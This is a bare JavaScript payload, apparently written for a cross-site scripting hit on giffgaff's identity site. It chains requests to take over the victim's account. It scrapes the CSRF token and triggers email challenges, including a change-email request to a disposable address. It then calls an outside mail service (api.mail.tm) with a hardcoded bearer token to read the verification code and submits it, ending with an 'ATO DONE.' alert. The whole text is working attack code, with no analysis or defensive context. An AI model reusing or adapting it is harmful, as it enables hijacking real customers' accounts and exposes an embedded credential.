var xhr = new XMLHttpRequest();
xhr.open("GET", "/auth/mfa/setup");
xhr.withCredentials = true;
xhr.onreadystatechange = () => {
        if (xhr.readyState == 4) {
            var domparser = new DOMParser();
            dom = new DOMParser().parseFromString(xhr.response, 'text/html');
            var csrf_token = JSON.parse(dom.getElementById("__NEXT_DATA__").innerText).props.pageProps.csrfToken.token
            xhr.open("POST", "https://id.giffgaff.com/auth/challenges/email", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.setRequestHeader("X-Csrf-Token", csrf_token);
            var body = '{"email":"test@testtt.com","source":"mfa-setup"}';
            xhr.onreadystatechange = () => {
                if (xhr.readyState == 4) {
                    window.setTimeout(() => {
                            xhr.open("POST", "https://id.giffgaff.com/auth/challenges/email", true);
                            xhr.setRequestHeader("Content-Type", "application/json");
                            xhr.setRequestHeader("X-Csrf-Token", csrf_token);
                            var body = '{"email":"vampire01_inti@indigobook.com","source":"change-email"}';
                            xhr.send(body)
                            xhr.onreadystatechange = () => {
                                if (xhr.readyState == 4) {
                                    window.setTimeout(() => {

                                        xhr.open("GET", "https://api.mail.tm/messages", true);
                                        xhr.setRequestHeader("Accept", "application/json");
                                        xhr.withCredentials = false;
                                        xhr.setRequestHeader("Authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3NDEyMTY3NzMsInJvbGVzIjpbIlJPTEVfVVNFUiJdLCJhZGRyZXNzIjoidmFtcGlyZTAxX2ludGlAaW5kaWdvYm9vay5jb20iLCJpZCI6IjY3YzhkYmM4NjFiYzVjN2Q4MTA5YWFiYSIsIm1lcmN1cmUiOnsic3Vic2NyaWJlIjpbIi9hY2NvdW50cy82N2M4ZGJjODYxYmM1YzdkODEwOWFhYmEiXX19.UGGCxzVjKiTlbGsVDdVyQ_-yddi_ZRLBfMS2y4Uibc2UWQ67oqUzUT2B2C8dLDN8sQkq_pawJW0BArIOtEjCgQ");
                                        xhr.onreadystatechange = () => {
                                            if (xhr.readyState == 4) {
                                                var code = JSON.parse(xhr.response)[0].intro.match(/[0-9]{6}/);

                                                xhr.open("POST", "https://id.giffgaff.com/auth/challenges/email/validate", true);
                                                xhr.withCredentials = true;
                                                xhr.setRequestHeader("Content-Type", "application/json");
                                                xhr.setRequestHeader("X-Csrf-Token", csrf_token);
                                                xhr.send(`{"code":${code}}`)
                                                xhr.onreadystatechange = () => {
                                                    if (xhr.readyState == 4) {
                                                        alert("ATO DONE.")
                                                    }
                                                }
                                            }
                                        }
                                        xhr.send()
                                    }, 7700)
                                }
                            }
                        },2000)
                    }
                }
                xhr.send(body);

            }
        }
        xhr.send()
